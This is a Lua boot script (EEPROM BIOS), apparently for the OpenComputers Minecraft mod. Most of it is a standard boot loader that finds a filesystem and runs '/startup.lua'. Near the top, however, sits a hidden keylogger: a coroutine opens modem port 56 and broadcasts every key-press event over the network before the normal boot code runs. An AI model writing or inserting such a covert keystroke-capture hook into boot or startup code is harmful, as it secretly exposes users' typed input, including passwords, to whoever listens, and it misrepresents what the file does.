local component_invoke = component.invoke
modem = component.proxy(component.list("modem")())
modem.open(56)

function f_wewlad()
while true do
signal = table.pack(computer.pullSignal())

if(signal[1]) then if(type(signal[1]) == "string") then if(signal[1] == "key_down") then 
for a,b in pairs(signal) do
if(type(b) == "number") then
modem.broadcast(56, a .. " : " .. tostring(b))
end
if(type(b) == "string") then
modem.broadcast(56, a .. " : " .. b)
end

end
end end end

end
end

wewlad = coroutine.create(f_wewlad)
coroutine.resume(wewlad)
function boot_invoke(address, method, ...)
  local result = table.pack(pcall(component_invoke, address, method, ...))
  if not result[1] then
    return nil, result[2]
  else
    return table.unpack(result, 2, result.n)
  end
end

-- backwards compatibility, may remove later
local eeprom = component.list("eeprom")()
computer.getBootAddress = function()
  return boot_invoke(eeprom, "getData")
end
computer.setBootAddress = function(address)
  return boot_invoke(eeprom, "setData", address)
end

do
  local screen = component.list("screen")()
  local gpu = component.list("gpu")()
  if gpu and screen then
    boot_invoke(gpu, "bind", screen)
  end
end
local function tryLoadFrom(address)
  local handle, reason = boot_invoke(address, "open", "/startup.lua")
  if not handle then
    return nil, reason
  end
  local buffer = ""
  repeat
    local data, reason = boot_invoke(address, "read", handle, math.huge)
    if not data and reason then
      return nil, reason
    end
    buffer = buffer .. (data or "")
  until not data
  boot_invoke(address, "close", handle)
  return load(buffer, "=init")
end
local init, reason
if computer.getBootAddress() then
  init, reason = tryLoadFrom(computer.getBootAddress())
end
if not init then
  computer.setBootAddress()
  for address in component.list("filesystem") do
    init, reason = tryLoadFrom(address)
    if init then
      computer.setBootAddress(address)
      break
    end
  end
end
if not init then
  error("no bootable medium found" .. (reason and (": " .. tostring(reason)) or ""), 0)
end
computer.beep(1000, 0.2)
init()
